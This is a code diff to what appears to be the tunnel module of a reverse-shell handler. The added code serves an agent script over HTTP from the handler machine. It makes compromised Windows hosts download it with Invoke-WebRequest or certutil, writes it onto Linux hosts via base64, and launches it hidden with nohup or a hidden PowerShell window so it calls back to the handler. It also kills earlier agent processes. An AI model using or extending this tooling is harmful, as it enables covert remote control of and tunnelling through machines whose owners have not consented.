@@ -6,25 +6,29 @@ import queue
 import select
 import socket
 import struct
-import threading
 import time
+import http.server
+import socketserver
+import random
+import urllib.parse
+import threading
 
 from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START, TUNNEL_REGISTER_MAGIC
 
-TUNNEL_POOL_SIZE = 6
+TUNNEL_POOL_SIZE = 12 
 RELAY_CHUNK = 65536
-UPLOAD_QUEUE_SIZE = 16
-DOWNLOAD_QUEUE_SIZE = 16
+UPLOAD_QUEUE_SIZE = 32
+DOWNLOAD_QUEUE_SIZE = 32
 MAX_FRAME = 4 * 1024 * 1024
-RELAY_IDLE_TIMEOUT = 2.0
-RELAY_ACTIVE_TIMEOUT = 60.0
-SOCK_BUF = 256 * 1024
+RELAY_ACTIVE_TIMEOUT = 120.0
+RELAY_IDLE_TIMEOUT = 5.0
+SOCK_BUF = 512 * 1024 
 FRAME_JSON = 0
 FRAME_SEND = 1
 FRAME_RECV_REQ = 2
 FRAME_RECV_RESP = 3
-MAX_IDLE_ROUNDS = 15
-MAX_CONCURRENT_RELAYS = 128
+MAX_IDLE_ROUNDS = 30
+MAX_CONCURRENT_RELAYS = 256
 CHANNEL_QUEUE_SIZE = 128
 RELAY_JOIN_TIMEOUT = 5.0
 AGENT_VERSION = 2
@@ -32,13 +36,13 @@ AGENT_VERSION = 2
 _REMOTE_AGENT_SOURCE = r'''
 import base64, json, socket, struct, sys, threading, time
 
-CHANNELS = 6
+CHANNELS = 12
 MAX_BUF = 4194304
 HIGH_WATER = 3145728
 LOW_WATER = 1048576
 MAX_FRAME = 4194304
 RECV_SIZE = 65536
-SOCK_BUF = 262144
+SOCK_BUF = 524288
 
 def recv_exact(conn, n):
     data = b''
@@ -121,13 +125,13 @@ def detect_handler_ip(revshell_port, fallback='127.0.0.1'):
             import subprocess
             out = subprocess.check_output(['netstat', '-n'], stderr=subprocess.DEVNULL, text=True, errors='ignore')
             for line in out.splitlines():
-                if 'ESTABLISHED' in line and f':{revshell_port}' in line:
+                if 'ESTABLISHED' in line:
                     for part in line.split():
-                        if part.count('.') == 3 and ':' in part:
+                        if part.count('.') == 3 and ':' in part and part.endswith(f':{revshell_port}'):
                             return part.rsplit(':', 1)[0]
         except Exception:
             pass
-    return fallback
+        return fallback
 
 def reset_entry(entry):
     with entry['buf_lock']:
@@ -514,21 +518,65 @@ class TunnelManager:
         self._counter = 0
         self._proxies = {}
         self._session_agents = {}
-        self._session_pools = {}       # client_sock -> [conn, ...]
-        self._channel_workers = {}     # id(conn) -> _ChannelWorker
-        self._channel_load = {}        # id(conn) -> active relay count
-        self._channel_rr = {}          # client_sock -> int
+        self._session_pools = {}
+        self._channel_workers = {}
+        self._channel_load = {}
+        self._channel_rr = {}
         self._token_sessions = {}
         self._channel_ready = {}
         self._session_stream_counters = {}
-        self._session_reset_gen = {}   # client_sock -> int
-        self._active_relays = {}       # client_sock -> {sid: _RelayHandle}
-        self._relay_sems = {}          # client_sock -> Semaphore
+        self._session_reset_gen = {}
+        self._active_relays = {}
+        self._relay_sems = {}
         self._deploy_locks = {}
         self._tunnel_listener = None
         self._tunnel_port = None
         self._last_error = ''
         self._ensure_tunnel_listener()
+
+    def _start_agent_http_server(self, content, port=None):
+        """Start a simple HTTP server serving the agent content on a random port.
+        Returns (port, server_thread, stop_event)."""
+        if port is None:
+            # Try a range of ports
+            for _ in range(20):
+                port = random.randint(8000, 9000)
+                try:
+                    server = socketserver.TCPServer(('0.0.0.0', port), self._make_agent_handler(content))
+                    break
+                except OSError:
+                    continue
+            else:
+                raise RuntimeError("Could not find a free port for HTTP server")
+        else:
+            server = socketserver.TCPServer(('0.0.0.0', port), self._make_agent_handler(content))
+        
+        stop_event = threading.Event()
+        def serve():
+            while not stop_event.is_set():
+                server.handle_request()
+            server.server_close()
+        thread = threading.Thread(target=serve, daemon=True)
+        thread.start()
+        return port, thread, stop_event, server
+
+    def _make_agent_handler(self, content):
+        """Factory for a request handler that serves the given content."""
+        class AgentHandler(http.server.SimpleHTTPRequestHandler):
+            def do_GET(self):
+                parsed = urllib.parse.urlparse(self.path)
+                if parsed.path == '/agent.py':
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'application/octet-stream')
+                    self.send_header('Content-Length', str(len(content)))
+                    self.end_headers()
+                    self.wfile.write(content)
+                else:
+                    self.send_response(404)
+                    self.end_headers()
+            def log_message(self, format, *args):
+                pass
+        return AgentHandler
 
     def _ensure_tunnel_listener(self):
         with self._lock:
@@ -896,6 +944,32 @@ class TunnelManager:
         info = self.h._client_info(client_sock)
         return f"s{info['id']}" if info else None
 
+    def _check_python(self, client_sock, shell_type, timeout=15.0):
+        start = TUNNEL_MARK_START
+        end = TUNNEL_MARK_END
+        
+        if shell_type == 'windows':
+            # PowerShell: run python -c and print marker
+            ps_cmd = (
+                f"$py=(Get-Command python -ErrorAction SilentlyContinue).Source;"
+                f"if(-not $py){{$py=(Get-Command python3 -ErrorAction SilentlyContinue).Source}};"
+                f"if($py){{& $py -c \"print('{start}PYTHON_OK{end}')\"}}else{{Write-Output '{start}NO_PYTHON{end}'}}"
+            )
+            result = self._tunnel_marked(client_sock, '', ps_cmd, 'windows', timeout=timeout)
+        else:
+            # Linux: run python -c and print marker
+            sh_cmd = (
+                f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null);"
+                f"if [ -n \"$PY\" ]; then \"$PY\" -c \"print('{start}PYTHON_OK{end}')\"; else printf '{start}NO_PYTHON{end}'; fi"
+            )
+            result = self._tunnel_marked(client_sock, sh_cmd, '', 'unix', timeout=timeout)
+        
+        # If result is None, we assume Python is not available or command failed
+        if result is None:
+            return False
+        
+        return result.strip() == 'PYTHON_OK'
+
     def _set_error(self, message):
         self._last_error = message
 
@@ -911,17 +985,60 @@ class TunnelManager:
             return self.h.inmemory.resolve_staging_path(client_sock, shell_type, name)
         return f"/tmp/.tornado_agent_{token}.py"
 
-    def _upload_agent(self, client_sock, agent_path, shell_type):
-        data = _REMOTE_AGENT_SOURCE.encode('utf-8')
-        chunk_size = self.h._write_chunk_size(agent_path, shell_type)
-        for offset in range(0, len(data), chunk_size):
-            if not self.h._remote_write_chunk(
-                client_sock, agent_path, data[offset:offset + chunk_size], shell_type,
-                truncate=(offset == 0), skip_flush=(offset > 0),
-            ):
-                self._set_error('failed to upload tunnel agent')
-                return False
-        return True
+    def _upload_agent(self, client_sock, agent_path, shell_type, handler_ip=None):
+        """
+        Upload the agent script to the remote target.
+        For Windows: uses an HTTP server + Invoke-WebRequest / certutil.
+        For Linux: uses base64 + base64 -d.
+        """
+        if shell_type != 'windows':
+            # Linux: base64 one-shot (unchanged)
+            data = _REMOTE_AGENT_SOURCE.encode('utf-8')
+            b64 = base64.b64encode(data).decode('ascii')
+            sh_cmd = (
+                f"echo '{b64}' | base64 -d > '{agent_path}' 2>/dev/null && "
+                f"printf '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
+            )
+            result = self._tunnel_marked(client_sock, sh_cmd, '', 'unix', timeout=30.0)
+            return result == 'OK'
+
+        # ----- Windows: HTTP download -----
+        if handler_ip is None:
+            handler_ip = client_sock.getsockname()[0]
+            self._log(client_sock, f"Using handler IP {handler_ip} for HTTP server")
+
+        content = _REMOTE_AGENT_SOURCE.encode('utf-8')
+        try:
+            port, thread, stop_event, server = self._start_agent_http_server(content)
+        except RuntimeError as e:
+            self._set_error(f"HTTP server start failed: {e}")
+            return False
+
+        # Build download command
+        url = f"http://{handler_ip}:{port}/agent.py"
+        # Escape the agent path for PowerShell
+        escaped_path = agent_path.replace("'", "''")
+        # Try Invoke-WebRequest first, fallback to certutil
+        ps_cmd = (
+            f"$ErrorActionPreference='Stop'; "
+            f"try {{ Invoke-WebRequest -Uri '{url}' -OutFile '{escaped_path}' -UseBasicParsing -ErrorAction Stop; "
+            f"Write-Output '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}' }} "
+            f"catch {{ certutil -urlcache -f '{url}' '{escaped_path}' 2>$null; "
+            f"if ($?) {{ Write-Output '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}' }} "
+            f"else {{ Write-Output '{TUNNEL_MARK_START}FAIL{TUNNEL_MARK_END}' }} }}"
+        )
+
+        result = self._tunnel_marked(client_sock, '', ps_cmd, 'windows', timeout=60.0)
+
+        # Stop the HTTP server (after download)
+        stop_event.set()
+        thread.join(timeout=2.0)
+
+        if result == 'OK':
+            return True
+        else:
+            self._set_error(f"HTTP download failed: {result or 'no response'}")
+            return False
 
     def _deploy_agent(self, client_sock):
         cached = self._session_agents.get(client_sock)
@@ -935,12 +1052,25 @@ class TunnelManager:
 
         self._ensure_tunnel_listener()
         shell_type = info.get('type', 'unix')
+        if not self._check_python(client_sock, shell_type):
+            self._set_error('Python is not installed on the remote host')
+            self._log(client_sock, 'Tunnel aborted: Python missing')
+            print(f"{self.h.colors['red']}Python not found on target – tunnel cannot start{self.h.colors['end']}")
+            return None
+        handler_ip = client_sock.getsockname()[0]
         token = self._agent_token(client_sock)
         tunnel_port = self._tunnel_port
         revshell_port = int(self.h.revshell_port)
         agent_path = self._remote_paths(client_sock, shell_type, token)
         path_esc = self.h._escape_path(agent_path, shell_type)
         token_esc = token.replace("'", "'\\''")
+        print(f"Using handler IP: {handler_ip}")
+        print(f"Agent path: {agent_path}")
+        print(f"Tunnel port: {tunnel_port}")
+
+        if not self._upload_agent(client_sock, agent_path, shell_type, handler_ip):
+            print(f"{self.h.colors['red']}Upload failed: {self._last_error}{self.h.colors['end']}")
+            return None
 
         self._token_sessions[token] = client_sock
         ready = threading.Event()
@@ -948,18 +1078,14 @@ class TunnelManager:
         ready.clear()
         self._drop_pool(client_sock)
 
-        if not self._upload_agent(client_sock, agent_path, shell_type):
-            return None
-
         if shell_type == 'windows':
             deploy_ps = (
                 f"$p='{path_esc}';"
                 f"$py=(Get-Command python -ErrorAction SilentlyContinue).Source;"
                 f"if(-not $py){{$py=(Get-Command python3 -ErrorAction SilentlyContinue).Source}};"
-                f"if(-not $py){{'{TUNNEL_MARK_START}NO_PYTHON{TUNNEL_MARK_END}';return}};"
                 f"Get-CimInstance Win32_Process -Filter \"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
                 f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }};"
-                f"Start-Process -FilePath $py -ArgumentList @($p,'auto',{tunnel_port},'{token}',{revshell_port}) "
+                f"Start-Process -FilePath $py -ArgumentList @($p,'{handler_ip}',{tunnel_port},'{token}',{revshell_port}) "
                 f"-WindowStyle Hidden | Out-Null;"
                 f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
             )
@@ -968,8 +1094,7 @@ class TunnelManager:
             unix_cmd = (
                 f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null); "
                 f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
-                f"if [ -z \"$PY\" ]; then printf '%sNO_PYTHON%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'; exit 0; fi; "
-                f"nohup \"$PY\" '{path_esc}' auto {tunnel_port} '{token_esc}' {revshell_port} >/dev/null 2>&1 & "
+                f"nohup \"$PY\" '{path_esc}' '{handler_ip}' {tunnel_port} '{token_esc}' {revshell_port} >/dev/null 2>&1 & "
                 f"printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
             )
             payload = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=25.0)
@@ -980,7 +1105,7 @@ class TunnelManager:
         if payload != 'OK':
             self._set_error('tunnel agent failed to start')
             return None
-        if not self._wait_for_channel(client_sock, token, timeout=30.0):
+        if not self._wait_for_channel(client_sock, token, timeout=60.0):
             self._set_error(f'agent did not connect to handler port {tunnel_port}')
             return None
 
